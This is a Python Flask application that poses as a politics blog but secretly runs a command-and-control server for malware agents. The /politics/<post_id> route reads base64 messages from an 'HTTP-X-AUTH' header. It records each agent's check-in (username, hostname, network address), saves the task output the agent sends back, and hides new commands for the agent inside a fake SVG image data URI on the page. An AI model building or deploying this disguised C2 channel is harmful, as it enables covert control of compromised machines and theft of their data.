from flask import Flask, render_template, abort, request
from database.database import HydrangeaDatabase
import json
import os
import base64

# Database
db = HydrangeaDatabase()

# Flask WSGI app
app = Flask(__name__)

############
# C2 METHODS
############

# Function to handle communication with agent; takes input from agent and saves it, returns message for agent
def handleAgentCommunication(agentMessage: str):
    """
    AGENT CHECK IN (agent -> listener)
    base64(agentid-checkin-username-hostname-network_addr)

    TASKS (agent <- listener)
    base64("none") / when there are no tasks for agent
    base64(taskid-base64(task),taskid-base64(task)) / when there are tasks for agent

    TASKS OUTPUT (agent -> listener)
    base64(agentid-output-base64("none")) / when agent has nothing to return 
    base64(agentid-output-base64(taskid-base64(output),taskid-base64(output))) / when agent has something to return
    """

    # Decode agent message
    agentMessageDecoded = base64.b64decode(agentMessage.encode("utf-8")).decode("utf-8")
    agentMessageDecodedSplit = agentMessageDecoded.split("-")

    # According to agent message type, perform some action
    agentId = agentMessageDecodedSplit[0]
    agentPurpose = agentMessageDecodedSplit[1]

    ## Checkin
    if agentPurpose == "checkin":
        if db.saveAgentInfo(
            agentId=agentId,
            host=f"{agentMessageDecodedSplit[3]} / {agentMessageDecodedSplit[4]}",
            username=agentMessageDecodedSplit[2]
        ):
            print(f"SUCCESS: Agent {agentId} checked in; saved")
        else:
            print(f"ERROR: Agent {agentId} checked in but could not be saved")
    ## Task output
    elif agentPurpose == "output":
        output = base64.b64decode(agentMessageDecodedSplit[2].encode("utf-8")).decode("utf-8")
        if output != "none":
            tasksOutput = output.split(",")
            for tasksData in tasksOutput:
                taskId, output = tasksData.split("-")
                outputDecoded = base64.b64decode(output.encode("utf-8")).decode("utf-8")
                if db.setTaskOutput(
                    taskId=taskId,
                    output=outputDecoded
                ):
                    print(f"SUCCESS: Saved output for Task ID '{taskId}' from Agent {agentId}")
                else:
                    print(f"ERROR: Could not save output for Task ID '{taskId}' from Agent {agentId}")

    # Return reply to agent
    tasksNew = db.getNewTasksForAgent(
        agentId=agentId,
        setTasked=True
    )
    if len(tasksNew) == 0:
        return "none"
    else:
        tasksToSend = [] # taskId-base64(task), taskId-base64(task)
        for taskNew in tasksNew:
            taskId = taskNew.id
            taskEncoded = base64.b64encode(taskNew.task.encode("utf-8")).decode("utf-8")
            tasksToSend.append(f"{taskId}-{taskEncoded}")
        agentReply = ",".join(tasksToSend) # "taskId-base64(task),taskId-base64(task)"
        return agentReply    

#############
# APP HELPERS
#############

def load_post(post_id):
    """Loads a post from a JSON file and adds the dynamic base64 image."""
    filepath = os.path.join("data", f"{post_id}.json")
    try:
        with open(filepath, 'r') as f:
            post = json.load(f)
        return post
    except FileNotFoundError:
        return None

def load_latest_posts(num_posts=3):
    """Loads the latest `num_posts` posts."""
    latest_posts = []
    for filename in os.listdir("data"):
        if filename.endswith('.json'):
            post_id = filename[:-5]
            post = load_post(post_id)
            if post:
                latest_posts.append(post)

    # Sort by date (assuming 'date' field exists and is in ISO format)
    latest_posts.sort(key=lambda x: x.get('date', '1970-01-01'), reverse=True)
    return latest_posts[:num_posts]

########
# ROUTES
########

@app.route("/")
def home():
    latest_post = load_latest_posts(1)[0] if load_latest_posts(1) else None
    other_recent_posts = load_latest_posts(4)[1:]
    return render_template("home.html", latest_post=latest_post, other_recent_posts=other_recent_posts)


@app.route("/politics/<post_id>")
def post(post_id):
    post = load_post(post_id)
    if post is None:
        abort(404)

    # Process agent outputs and send next tasks to agent
    agentMessage = request.headers.get("HTTP-X-AUTH")
    if agentMessage is not None:
        agentReply = handleAgentCommunication(
            agentMessage=agentMessage
        )
        agentReplyEncoded = base64.b64encode(agentReply.encode("utf-8")).decode("utf-8")

        # Insert message to agent in base64 data for image
        post['hero_image_base64'] = f"data:image/svg+xml;base64,{agentReplyEncoded}"
    else:
        post['hero_image_base64'] = "data:image/svg+xml;base64,/9j/4QDeRXhpZgAASUkqAAgAAAAGABIBAwABAAAAAQAAABoBBQABAAAAVgAA"

    # Return rendered out webpage
    return render_template("post.html", post=post, related_posts=[])


@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/contact")
def contact():
    return render_template("contact.html")

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404
